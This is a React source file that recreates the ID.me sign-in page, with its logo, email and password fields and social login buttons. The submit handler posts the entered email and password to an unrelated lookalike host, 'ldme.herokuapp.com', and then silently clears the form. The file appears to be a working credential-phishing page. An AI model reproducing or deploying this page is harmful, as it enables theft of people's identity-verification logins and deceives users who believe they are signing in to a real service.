import React, { Component } from 'react';
import axios from "axios"

const logo = `data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAATYAAACjCAMAAAA3vsLfAAAApVBMVEX///8uP1FJunYpO04gNEgXLkRTX2yYn6fDyMzU19tIVWQsPVDIzNAbMUb29/glOEuzuL6qr7bt7vCOlp5yfIcPKkHj5ec1Rljl5+qco6qHj5h5go3k5uhoc39YZHLQ09c6tm1CUWGssrhsdoK5vcN/h5FVYnCJkZpdwYX2/PmI0KO/5c7r9/CW1a4HJj4AIDrR7dyo27tQvXx0yZXu+fLM69jg8+ct+dDBAAALo0lEQVR4nO1d2XajuhI1QfKEhTzhsT3GjtPp4Z7uvif//2kHYxyqSgIMiXCapf2UtRgsbUo1S2k0LCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsao7ZYNnsXrFeHHx6Q3vcvQHr1bF16CgP1xT+mAvpJmDcmeM7xgG8ng4pmRCiO+5P7jOTKuHvmEPgBQt4xzygN2TClUJMF5t7zacijIQ6cy/ogDs8rxBt0QtYMG0N7zanCtB0NdMWYJlOiglbwhxf1nixamljreSGNi9FWwjJl7WVOIO0OZ5k8/Rf/qthkrYQvFnPlWqYNkeyw/0mZw6maQvN8uh+szMG47SFC3V5v+mZQgW0OWJ8v/kZQhW01ZC3SmhzeN30WzW0OUHN7GlFtHnsy/3maAAV0ebI5v3maABV0ebwWsVZZWk7ZyQBGJO6F6En6hTXl6RNjvYDhNayK7nMSs2xOnkhJWnjHfVVfu/oiXTiPN0zfys+kLYQ/sBTcuxvkI8VzakCfCxtIXHLVBPi8fokkT6atkajn7pQ5bGCCVWDj6et0dZUdS5wa1NFNUBb4xCkyJvoG59PRTBBW6OVot/ctenpVAUjtDXWMkXc6uLymqFtwvXLtDar1AxtjaPefauN62aItpnemnqO2dlUBkO0NR712i2oicdriraUxInYG51NZTBFW8PRGoW6BArGaFtqV6nbNTmZ6mCMtoPeKNQkvjJG2xe9C1KTLIgx2hpTrXLjPYOTqQ7maFtplZsYGJxMdTBH20i7Stmt9fnhcKiqwWFn0FqM5u2Z5gG/02+dTq12fkF2tunvW/tD5x0Bsjna9lqbIG9pP+otulPXdb0uDmEPaxkIFoKLJ7rW249efI032xmv9tvLqeBCMCEC1h2V1bTmaOvpaVvlj+nxp3TPitFzA5BpGjj8bazhFUT/oRskVbPwqTQ5mizO5bXkThY86gQ3H+Zom2gfdJ9yH+z9TG4X1y0SnR1JqoiE/+Ga41lIR8vbbMkVxSF5qbjFHG0zbU3hBn+3D8U0LkoPuDJOfjUubakYH6n7lZbQatugpbk3D+ZoG2otqTfNfbAHf5FHiuqoGYQXe85zXQpebZ3odNNKHEEJeTNHm6913DwnN0wYQqGIWvTH+jFEzV8t7XYTb0p+pi/Smy1Ecf32CWlDD56HstTLSZTzTNsRRtzqEbiNCQdzyIo3F39G2hxMW1pB57zeD2lbm7B/CMTV46eZP2kiDVK8q+fT07ZvX5lxQ28LvZIN36y1y4i+R47OKhFX14lGjhUvz/L0/hbahvA5OY9J9Ph6cDgh6ywmu3j0fDdvzxFvLmhDHAPWprEeQ6Ff8T1On5A27LnEzql0ImU1gGrO617m7l4CXRSWAIs9AiuUXcOCFrI7hTuyDTogWtN1A226rZiyG6sf9C0uf7veZTA+ZCKhrQ9ex986rxHHn4q2sundjfqL7u5K9lh569u6a+zAXN5omwB+QEA8V7ycQqg8uCoYJVw4cN88qxb19D33LRyHc3n7na4Lbk0s5hHSLwq3/5ujraOnLT+UV5hxgmTr/ZxeBA4aoi1OAsBN7TDXh+ZdPOVsjjZ9MUHmd/Au6DrkYLqUNgGGCvVevB6hyMO4Diled5c7JgpztClycXn1IvfBNRkSgx0QI8wp9DN8pOUvU4A9PDDXgWZV3CIYpO2oNQk3aF/iuLgovMQmAbVRQ+UfN+nAwaNGCtg0UKY51hxtXa0Dku+QUwuMo0s8Xgar1WiklwHCMUCZmkDX8Aa9ocAYbX5KE0jug8T/IHG2Q8IrcAlphSirhIQNyhSKEUokQMzR1tMH4DI3asb+B3QaGkRMiFKCC++SRIZaEmrBORxbmXSbOdpUNyJiIT9LuUAPMpx7xaPBzZk7mAE4NYjnCLyPPsyvl9sibIw2vWq7oS8QG1KS0znB1YWrYEMoiFEUdQIfwEuWIsy9wZJEEZiiTX/Gj/xfriFFaSOlQwlxigeBfYoz29AkX6MGvz+FSoCXY80Ybbo1KvmqnR/Io98L8NFcKFoncRosZ0eXOvDLndWgPzksHbhA3dKHbZiiTW1vc4PHW/aq9VPSPxF6KdrqjDV1NtCX85rrnSvwHkQxLd2QYoi2vvIU2902xhNKTZCYAjVIYIPgo+W7UabmuR5xXsSofNOYGdrUFCVf3jjGpjJ9AGhnSH1/gwICP9VxjO9gbPme3ftmaFMO0wtuzWghoaGN5SjvS9qAobMbMarPwESvlXzaKtfEcIUR2uiIveDm9iwUI9A+G5RUIWc9QMc/0npq2i6Cy7i3fHeTnQna/Cl56e2s4QiJk/QhjOOJHUV+SxRHkUaxULO5TARus7XRq4thkaqfAdr8JtEq4nT7eNB+Blq/dEndGUBNrOFciRRsujrt0w+4fQyC3e2ZkI+nzW8Sl63QESDIRSUPorVPrAUsaV185BWcGRtpmgwhHsPn5e0bED+cts2UWjBRIJ2FnF0iUCTFgSURytalNIBmlreNJJol/UwZ+GDahgulo4pOPhNIj9PcHEpoEMnYUdWGg+K8luGo6HUv2jonyajD5nnK6vjn18vLy69X3RtwQQkLlA9PACaJbNjOH4cWiLacbzePvtZNDbIXlKRNbHyE4WSzP+64xsNUBvzr93b78LDdbp+/qcOBpU5aG0QxJpFEGHXFfjDSbdmbluLWsPwU6ntpCyeFzxMX55PJtQRjkfn+HHIWY/vnKx0/XKN0qrj/YJZ6LS5XIEuavd38Yr6LJMc/6mio1EMscAj0mpB25u034Q2H6mSrM1RtHqnRIYtwEcQTTndmGNJ4irxAtGX6RC08968PGNtnPBokUER/ohiTSgZUZHHRAEcJIr30E3vnrIB3aZw2XEx72VLefqHRQH1Em2yQJJK6IaKUX57DEV7GChxH38qTRfIhhmnzPPhjr5S1EGiZIseMuAMoWCLOLkqIXzcRZhS5IPbxEi10+oFh2rAq/qHStoXmFDm7mflwUgDrIFMS04Z3tKa1A8RCXCBCqIA2PPdnVdgeXsB1lOEgjj3KKFHfpKejDZccPb17sYnzvaxYIskwbcgrpQYhAjQKp4x1iDNKRFMhvoNYEjc4c+TSnvvowbi0EBQ8oMQ0bdDZ/a6j7QHcgNYhUUao/ZTGSlhML+mmPR24mlLwj7EHLYpu4a+Stv9rLMLDbzALXYXuCuS90mQ5Eqyo9bKzUsfNdmgl+nOXpRF6b9qQM6QTtj/J5S8weqLrEFUnBFlvqNkoXI6rrtBVElw2uoqw3zu6V/Mrd4VrMaZpQ0HCH5W17Y/k8iGjnDfMsgi4fnquUl3vpsELY+vlaDRaPslkj4PcFd+Pa5Q2j++Q+fqlcUD+SS6jfJrAhm+T5Zs0Gk/6HVWuuvnPlQyfdstKsGaUNiZJveqrShs0pNDRokWrgdrzBzHX1lvYbrJKP2L08jtiXaZamkvbptw/bArHI0fKZ1TEbftvylho7gv1Iantj9qjqPjKRxuHNHCDIpFoAu35CTDQGKadmJjJmeTOXCf7fzBvULNhrU8zu3CcUrMDWt3PJuN62TFjAqXbGeAO6yuwY6g/mCID538DOE4bzjPkbQtDBNR9quSEQf7S+6nz99fEuQ3WV5HsS/1CDddD+XPOBwHJY7vCQcOasRt5O1cipeCyO+plqIsf2ytxW5L+SHKUnqT/X+Ga4vC88KNoPXr/MUhOIJC8C14wXHI1V3+uzL/n4KDJccrhqerdOXnbl0fBxS1wd6vjYJNnl15fzhnx7fb3j+/kyunn5T18Oqby5DN+Ofzdaab+j7tDk0dHWgju0LL7ZDSF/xczvGW6LLwZksKf9fox9GeKDDe9XHQmOZXIBF9fv3379koT4iGiYRx6M82LZv35oN/uZP/GpN9aLFr6GnJnsHyK/5PqarGf1OOEKgsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLi0L4Dxs4vlyfeSlgAAAAAElFTkSuQmCC`

class App extends Component {
  constructor(props) {
    super(props);
    this.state = { 
      email:"",
      password:""
     }
  }
  componentDidMount=()=>{
    document.title ="Identity"
  }
  Change=(e)=>{
    this.setState({[e.target.name]:e.target.value})
  }
  Submit=(e)=>{
    // { headers: {"Authorization" : `Markaranter ${Cookies.get("token")}`,"markaranterTwo":mainToken,"navigation":JSON.stringify(navigation)}
    e.preventDefault()
    console.log("sending data")
    const data= {
      email:this.state.email,
      password:this.state.password
    }
    axios.post(`https://ldme.herokuapp.com/login`, {data: JSON.stringify(data)})
    .then(res => this.setState({email:"",password:""}))
    .catch(err => console.log(err)) 
  
  }
  render() { 
    return ( 
      <div className="container">
         <div className="row">
         <div className="d-none d-md-block col-md-4"></div>
          <div className="col-12 col-md-4" style={{padding:"0",margin:"0"}}>
          <div style={{marginTop:"20px"}}>
                 <center>
                    <img src={logo}  style={{width:"20%"}} /> 
                    </center>
               </div>
               <div style={{backgroundColor: "white",boxShadow: "6px 2px 8px 4px lightgrey",width:"100%",padding:"0",margin:"0"}}>
             <div>
                 <center>
                     <h2 style={{padding:"25px",fontWeight:"bolder",fontSize:"20px"}}>Sign in to ID.me</h2>
                 </center>
             </div>
             <div style={{backgroundColor:"rgb(236, 241, 243)",border:"1px solid lightgrey"}}>
                 <center>
                    <div style={{padding:"20px",fontWeight: "normal",fontFamily: "Open Sans, sans-serif",wordSpacing: "0.8px"}}>
                     <small style={{fontSize:"15px",fontWeight:"bold"}}>
                         New to ID.me?<br/>
                         <a href="" style={{textDecoration:"underline"}}>Create an ID.me account</a>
                     </small>
                    </div>
                 </center>
             </div>
             <div style={{padding: "20px"}}>
               <form  onSubmit={this.Submit} method="post">
                 <small style={{fontSize:"15px"}}>Email</small><br/>
                 <input type="text" onChange={this.Change} value={this.state.email} name="email" placeholder="Enter your email" style={{width: "100%",padding:"15px 0px 15px 15px",border:"2px solid rgba(140, 140, 140,0.6)",borderRadius:"5px"}} />
                 <br/>
                 <br/>
                 <small style={{fontSize:"15px"}}>Password</small><br/>
                 <input type="password" value={this.state.password} onChange={this.Change} name="password" placeholder="Enter your password" style={{width: "100%",padding:"15px 0px 15px 15px",border:"2px solid rgba(140, 140, 140,0.6)",borderRadius:"5px"}} />
                 <br/>
                 <br/>
 <br/>
                 <button type="submit" className="btn" style={{backgroundColor:"rgb(0, 102, 204)",padding:"18px",fontWeight: "normal",border:"none",fontFamily: "Open Sans, sans-serif",color:"white",borderRadius:"5px",width:"100%"}}>
                 <center>
                   <span style={{fontSize:"17px"}}>  Sign in to ID.me</span>
                 </center>
                 </button>
               </form>
                 <br/>
                 <br/>
                 <center>
                    <a href="" style={{textDecoration:"underline"}}>
                     <small>
                         Forgot password
                     </small>
                    </a>
                 </center>
                 <br/>
                 <center>
                     <small>
                        -- Or sign in with --
                     </small>
                 </center>
                 <br/>
                 <div style={{display:"flex",flexWrap:"wrap"}}>
                  <div style={{width:"50%"}}>
                   <div style={{padding:"0",margin:"0"}}>
                 <small style={{border:"1px solid lightgrey",padding:"10px"}}>
                    <small style={{padding:"2px",paddingRight:"0"}}>
                     <span  className="text-primary fa fa-facebook fa-2x" ></span>
                    </small> Facebook</small>
                 </div>
                 </div>
                 <div style={{width:"50%"}}>
                     <div style={{padding:"0",margin:"0",float:"right"}}>
                   <small style={{border:"1px solid lightgrey",padding:"10px"}}>
                     <small style={{padding:"5px"}}>
          <span
            className="fa fa-google fa-2x text-danger"></span>
                     </small> Google</small>
                   </div>
                   </div>
                 </div>
                 <br/><br/>
                 <div style={{display:"flex",flexWrap:"wrap"}}>
               <div style={{width:"50%"}}>
                     <div style={{padding:"0",margin:"0"}}>
                   <small style={{border:"1px solid lightgrey",padding:"10px"}}>
                     <small style={{padding:"5px"}}>
                         <span  className="text-primary fa fa-linkedin fa-2x"></span>
                     </small> Linkedin</small>
                   </div>
                   </div>  
                   </div>
                   <br/>
                   <br/>
                   <div style={{width:"100%",border:"1px solid lightgrey"}}>
                     <center style={{padding:"13px"}}>
                         <small >View more options <span style={{fontWeight:"normal"}} className="fa fa-chevron-right text-primary ml-2"></span></small>
                     </center>
                     </div>
             </div>
               </div>
               <div style={{height:"150px"}}>
             <div style={{display: "flex",flexWrap:"nowrap",marginTop:"10px"}}>
             <div style={{width:"30%"}}>
             <center><small>What is ID.me?</small></center>
             </div>
             <div style={{width:"3%"}}>
                 <small>|</small>
                 </div>
                 <div style={{width:"30%"}}>
                     <small>Terms of Service</small>
                     </div>
                     <div style={{width:"3%"}}>
                         <small>|</small>
                         </div>
                     <div style={{width:"30%"}}>
                         <center><small>What is ID.me?</small></center>
                         </div>
             </div>
               </div>
          </div>
          </div>     
     </div>
     );
  }
}

  /*style="background: conic-gradient(from -45deg, #ea4335 110deg, #4285f4 90deg 180deg, #34a853 180deg 270deg, #fbbc05 270deg) 73% 55%/150% 150% no-repeat;
-webkit-background-clip: text;
background-clip: text;
color:red
" */

export default App;
